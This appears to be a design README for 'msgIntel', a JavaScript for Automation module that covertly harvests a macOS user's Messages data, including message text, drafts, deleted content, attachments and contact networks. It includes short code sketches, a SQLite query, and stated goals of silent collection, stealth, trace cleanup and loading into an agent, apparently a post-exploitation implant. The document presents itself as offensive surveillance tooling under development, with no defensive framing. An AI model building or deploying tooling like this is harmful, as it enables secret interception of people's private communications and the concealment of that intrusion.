# msgIntel - Messages Intelligence Collection Module

## Purpose
JXA-based module for collecting intelligence from macOS Messages.app data stores. Designed for:
- Silent data collection
- Message content analysis
- Contact relationship mapping
- Communication pattern analysis
- Draft message recovery
- Attachment extraction

## Current Collection Capabilities

| Collector | Data Points | Status | Collection Gaps |
|-----------|-------------|--------|-----------------|
| Messages | - Message content<br>- Timestamps<br>- Service info<br>- Basic metadata | 🔄 Partial | - No thread mapping<br>- Missing deleted content<br>- Limited metadata |
| Drafts | - Draft content<br>- Recipient info<br>- Attachments<br>- State data | 🔄 Partial | - No sync status<br>- Missing history<br>- Limited metadata |
| Search | - Text content<br>- Basic matching | 🔄 Basic | - No pattern matching<br>- Missing context<br>- No correlation |
| Contacts | - Basic info<br>- Service data | ❌ Limited | - No relationship mapping<br>- Missing metadata<br>- No correlation |
| Attachments | - Basic listing<br>- File info | ❌ Limited | - No content analysis<br>- Missing metadata<br>- No extraction |

## Integration Points

### Agent Loading
```javascript
// Load as intelligence module
import { MsgIntel } from './msgIntel2.js';
const collector = new MsgIntel();

// Silent collection
const data = await collector.gather();
```

### Data Formats
- All output in structured JSON
- Consistent timestamp formats
- Standardized metadata fields
- Correlation IDs for mapping

### Collection Methods
1. Direct Database Access
   - SQLite queries
   - File system reads
   - Property list parsing

2. Memory Analysis
   - Draft content recovery
   - Attachment analysis
   - Metadata extraction

## Collection Gaps & Limitations

### Data Access
- Limited to current user context
- Requires disk access permissions
- No real-time monitoring
- Missing deleted content

### Analysis Capabilities
- Basic text search only
- No pattern recognition
- Limited relationship mapping
- Missing timeline analysis

### Integration Issues
- No streaming collection
- Basic error handling
- Limited stealth options
- Missing cleanup

## Required Improvements

### Collection Enhancement
1. **Message Collection**
   - Full thread recovery
   - Deleted content access
   - Complete metadata
   - Pattern analysis

2. **Contact Analysis**
   - Relationship mapping
   - Service correlation
   - Communication patterns
   - Contact networks

3. **Attachment Handling**
   - Content extraction
   - Type analysis
   - Metadata recovery
   - File carving

### Stealth Operations
1. **Access Methods**
   - Minimize disk operations
   - Reduce memory footprint
   - Handle permission issues
   - Clean operation traces

2. **Error Handling**
   - Silent failure modes
   - Data corruption handling
   - Permission fallbacks
   - Recovery options

## Usage Notes

### Integration Example
```javascript
// Silent collection mode
const options = {
    silent: true,
    cleanup: true,
    stealth: true
};

const intel = new MsgIntel(options);
const data = await intel.collect();
```

### Data Correlation
```javascript
// Correlate across sources
const messages = await intel.getMessages();
const drafts = await intel.getDrafts();
const contacts = await intel.getContacts();

// Map relationships
const network = intel.mapNetwork(messages, contacts);
```

### Cleanup Operations
```javascript
// Remove operation traces
await intel.cleanup();
```

## Development Focus
1. Enhance collection capabilities
2. Improve stealth operations
3. Add correlation analysis
4. Implement network mapping
5. Add pattern detection

## Core Design Patterns

### Handles Cache Pattern
All classes that interact with contact data implement a consistent handles caching pattern:

1. **Constructor Initialization**
```javascript
constructor() {
    super(MsgIntelUtils.DBS.chat);
    this.handles = this.getHandles();  // Initialize handles cache
}
```

2. **Standard Cache Method**
```javascript
getHandles() {
    const sql = `SELECT ROWID, id, country FROM handle;`;
    const results = this.query(sql);
    return {
        byRowId: new Map(results.map(h => [h.ROWID, h])),
        byId: new Map(results.map(h => [h.id, h]))
    };
}
```

3. **Usage Pattern**
- Used by Messages, Attachments, Search, and HiddenMessages classes
- Required for MsgIntelUtils.mapCommunication()
- Provides consistent contact resolution
- Optimizes database access

### Benefits
1. **Performance**
   - Single query for handle data
   - In-memory lookups vs repeated queries
   - Reduced database load

2. **Consistency**
   - Standardized contact resolution
   - Uniform data structure
   - Reliable relationship mapping

3. **Maintainability**
   - Common pattern across classes
   - Centralized handle logic
   - Simplified debugging
